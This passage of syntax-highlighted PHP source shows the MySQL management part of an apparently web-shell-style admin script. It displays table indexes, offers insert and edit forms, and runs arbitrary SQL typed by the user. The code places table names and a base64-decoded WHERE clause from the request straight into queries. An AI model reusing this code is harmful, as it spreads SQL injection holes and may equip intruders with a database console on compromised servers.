<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;Collation&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;Null&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;Comment&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;/tr&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">foreach</span> ($<span style="color: #eab700;">rowdb</span> <span style="color: #718c00;">as</span> $<span style="color: #eab700;">row</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">thisbg</span> = <span style="color: #4d4d4c; background-color: #ffffff;">bg(</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;tr class="'</span>.$<span style="color: #eab700;">thisbg</span>.<span style="color: #3e999f;">'" onmouseover="this.className=\</span><span style="color: #3e999f; text-decoration: underline;">'focus\';" onmouseout="this.className=\''</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">thisbg</span><span style="text-decoration: underline;">.</span><span style="color: #3e999f; text-decoration: underline;">'\';"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;'</span>.$<span style="color: #eab700;">row</span>[<span style="color: #3e999f;">'Key_name'</span>].<span style="color: #3e999f;">'&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;'</span>.$<span style="color: #eab700;">row</span>[<span style="color: #3e999f;">'Index_type'</span>].<span style="color: #3e999f;">'&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;'</span>.($<span style="color: #eab700;">row</span>[<span style="color: #3e999f;">'Non_unique'</span>] ? <span style="color: #3e999f;">'No'</span> : <span style="color: #3e999f;">'Yes'</span>).<span style="color: #3e999f;">'&amp;nbsp;&lt;/td</span><span style="color: #3e999f; text-decoration: underline;">&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;'</span>.($<span style="color: #eab700;">row</span>[<span style="color: #3e999f;">'Packed'</span>] === <span style="color: #4271ae;">null</span> ? <span style="color: #3e999f;">'No'</span> : $<span style="color: #eab700;">row</span>[<span style="color: #3e999f;">'Packed'</span><span style="text-decoration: underline;">]).</span><span style="color: #3e999f; text-decoration: underline;">'&amp;nbsp;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;'</span>.$<span style="color: #eab700;">row</span>[<span style="color: #3e999f;">'Seq_in_index'</span>].<span style="color: #3e999f;">'&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;'</span>.$<span style="color: #eab700;">row</span>[<span style="color: #3e999f;">'Column_name'</span>].($<span style="color: #eab700;">row</span>[<span style="color: #3e999f;">'Sub_part'</span>] ? <span style="color: #3e999f;">'('</span>.$<span style="color: #eab700;">ro</span><span style="color: #eab700; text-decoration: underline;">w</span><span style="text-decoration: underline;">[</span><span style="color: #3e999f; text-decoration: underline;">'Sub_part'</span><span style="text-decoration: underline;">].</span><span style="color: #3e999f; text-decoration: underline;">')'</span><span style="text-decoration: underline;"> : </span><span style="color: #3e999f; text-decoration: underline;">''</span><span style="text-decoration: underline;">).</span><span style="color: #3e999f; text-decoration: underline;">'&amp;nbsp;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;'</span>.($<span style="color: #eab700;">row</span>[<span style="color: #3e999f;">'Cardinality'</span>] ? $<span style="color: #eab700;">row</span>[<span style="color: #3e999f;">'Cardinality'</span>] : <span style="color: #4d4d4c; background-color: #ffffff;">0</span>)<span style="text-decoration: underline;">.</span><span style="color: #3e999f; text-decoration: underline;">'&amp;nbsp;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;'</span>.$<span style="color: #eab700;">row</span>[<span style="color: #3e999f;">'Collation'</span>].<span style="color: #3e999f;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;'</span>.$<span style="color: #eab700;">row</span>[<span style="color: #3e999f;">'Null'</span>].<span style="color: #3e999f;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;'</span>.$<span style="color: #eab700;">row</span>[<span style="color: #3e999f;">'Comment'</span>].<span style="color: #3e999f;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;/tr&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">tbfoot(</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">elseif</span> ($<span style="color: #eab700;">doing</span> == <span style="color: #3e999f;">'insert'</span> || $<span style="color: #eab700;">doing</span> == <span style="color: #3e999f;">'edit'</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">result</span> = <span style="color: #4d4d4c; background-color: #ffffff;">q(</span><span style="color: #3e999f;">'SHOW COLUMNS FROM '</span>.$<span style="color: #eab700;">tablename</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">while</span> ($<span style="color: #eab700;">row</span> = <span style="color: #4d4d4c; background-color: #ffffff;">mysql_fetch_array(</span>$<span style="color: #eab700;">result</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">rowdb</span>[] = $<span style="color: #eab700;">row</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">rs</span> = <span style="color: #4d4d4c; background-color: #ffffff;">array(</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">doing</span> == <span style="color: #3e999f;">'insert'</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;h2&gt;Insert new line in '</span>.$<span style="color: #eab700;">tablename</span>.<span style="color: #3e999f;">' table &amp;raquo;&lt;/</span><span style="color: #3e999f; text-decoration: underline;">h2&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">else</span> {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;h2&gt;Update record in '</span>.$<span style="color: #eab700;">tablename</span>.<span style="color: #3e999f;">' table &amp;raquo;&lt;/h2</span><span style="color: #3e999f; text-decoration: underline;">&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">where</span> = <span style="color: #4d4d4c; background-color: #ffffff;">base64_decode(</span>$<span style="color: #eab700;">base64</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">result</span> = <span style="color: #4d4d4c; background-color: #ffffff;">q(</span><span style="color: #3e999f;">"SELECT * FROM $tablename WHERE $where LIMIT</span><span style="color: #3e999f; text-decoration: underline;"> 1"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">rs</span> = <span style="color: #4d4d4c; background-color: #ffffff;">mysql_fetch_array(</span>$<span style="color: #eab700;">result</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;form method="post" action="'</span>.$<span style="color: #eab700;">self</span>.<span style="color: #3e999f;">'"&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span>$<span style="color: #eab700;">dbform</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'action'</span>,<span style="color: #3e999f;">'mysqladmin'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'tablename'</span>,$<span style="color: #eab700;">tablename</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;table border="0" cellpadding="3" cellspacing="0"&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">foreach</span> ($<span style="color: #eab700;">rowdb</span> <span style="color: #718c00;">as</span> $<span style="color: #eab700;">row</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">rs</span>[$<span style="color: #eab700;">row</span>[<span style="color: #3e999f;">'Field'</span>]]) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">value</span> = <span style="color: #4d4d4c; background-color: #ffffff;">htmlspecialchars(</span>$<span style="color: #eab700;">rs</span>[$<span style="color: #eab700;">row</span>[<span style="color: #3e999f;">'Field'</span>]]);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">else</span> {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">value</span> = <span style="color: #3e999f;">''</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">thisbg</span> = <span style="color: #4d4d4c; background-color: #ffffff;">bg(</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;tr class="'</span>.$<span style="color: #eab700;">thisbg</span>.<span style="color: #3e999f;">'" onmouseover="this.className=\</span><span style="color: #3e999f; text-decoration: underline;">'focus\';" onmouseout="this.className=\''</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">thisbg</span><span style="text-decoration: underline;">.</span><span style="color: #3e999f; text-decoration: underline;">'\';"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">row</span>[<span style="color: #3e999f;">'Key'</span>] == <span style="color: #3e999f;">'UNI'</span> || $<span style="color: #eab700;">row</span>[<span style="color: #3e999f;">'Extra'</span>] == <span style="color: #3e999f;">'auto_incre</span><span style="color: #3e999f; text-decoration: underline;">ment'</span><span style="text-decoration: underline;"> || $</span><span style="color: #eab700; text-decoration: underline;">row</span><span style="text-decoration: underline;">[</span><span style="color: #3e999f; text-decoration: underline;">'Key'</span><span style="text-decoration: underline;">] == </span><span style="color: #3e999f; text-decoration: underline;">'PRI'</span><span style="text-decoration: underline;">) {</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;&lt;b&gt;'</span>.$<span style="color: #eab700;">row</span>[<span style="color: #3e999f;">'Field'</span>].<span style="color: #3e999f;">'&lt;/b&gt;&lt;br /&gt;'</span>.$<span style="color: #eab700;">row</span>[<span style="color: #3e999f;">'Type'</span>].<span style="color: #3e999f; text-decoration: underline;">'&lt;/td&gt;&lt;td&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">value</span><span style="text-decoration: underline;">.</span><span style="color: #3e999f; text-decoration: underline;">'&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">else</span> {<span style="color: #c82829; background-color: #d6d6d6;">                            </span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;&lt;b&gt;'</span>.$<span style="color: #eab700;">row</span>[<span style="color: #3e999f;">'Field'</span>].<span style="color: #3e999f;">'&lt;/b&gt;&lt;br /&gt;'</span>.$<span style="color: #eab700;">row</span>[<span style="color: #3e999f;">'Type'</span>].<span style="color: #3e999f; text-decoration: underline;">'&lt;/td&gt;&lt;td&gt;&lt;textarea class="area" name="insertsql['</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">row</span><span style="text-decoration: underline;">[</span><span style="color: #3e999f; text-decoration: underline;">'Field'</span><span style="text-decoration: underline;">].</span><span style="color: #3e999f; text-decoration: underline;">']" style="width:500px;height:60px;overflow:auto;"&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">value</span><span style="text-decoration: underline;">.</span><span style="color: #3e999f; text-decoration: underline;">'&lt;/textarea&gt;&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">doing</span> == <span style="color: #3e999f;">'insert'</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;tr class="'</span>.<span style="color: #4d4d4c; background-color: #ffffff;">bg(</span>).<span style="color: #3e999f;">'"&gt;&lt;td colspan="2"&gt;&lt;input class="bt</span><span style="color: #3e999f; text-decoration: underline;">" type="submit" name="insert" value="Insert" /&gt;&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">else</span> {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;tr class="'</span>.<span style="color: #4d4d4c; background-color: #ffffff;">bg(</span>).<span style="color: #3e999f;">'"&gt;&lt;td colspan="2"&gt;&lt;input class="bt</span><span style="color: #3e999f; text-decoration: underline;">" type="submit" name="update" value="Update" /&gt;&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'base64'</span>, $<span style="color: #eab700;">base64</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;/table&gt;&lt;/form&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">else</span> {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">querys</span> = @<span style="color: #4d4d4c; background-color: #ffffff;">explode(</span><span style="color: #3e999f;">';'</span>,$<span style="color: #eab700;">sql_query</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">foreach</span>($<span style="color: #eab700;">querys</span> <span style="color: #718c00;">as</span> $<span style="color: #eab700;">num</span>=&gt;$<span style="color: #eab700;">query</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">query</span>) {
